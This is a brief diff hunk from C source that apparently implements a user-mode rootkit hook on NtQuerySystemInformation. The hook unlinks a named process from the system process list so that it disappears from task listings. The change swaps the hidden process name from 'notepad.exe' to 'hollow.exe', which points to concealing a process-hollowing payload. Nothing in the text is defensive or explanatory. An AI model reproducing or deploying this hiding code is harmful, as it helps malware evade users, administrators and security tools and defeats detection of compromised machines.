@@ -50,7 +50,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
 			pCurrent = pNext;
 			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
-			if (!wcsncmp(pNext->ImageName.Buffer, L"notepad.exe", pNext->ImageName.Length)) {
+			if (!wcsncmp(pNext->ImageName.Buffer, L"hollow.exe", pNext->ImageName.Length)) {
 				if (!pNext->NextEntryOffset)
 					pCurrent->NextEntryOffset = 0;
 				else
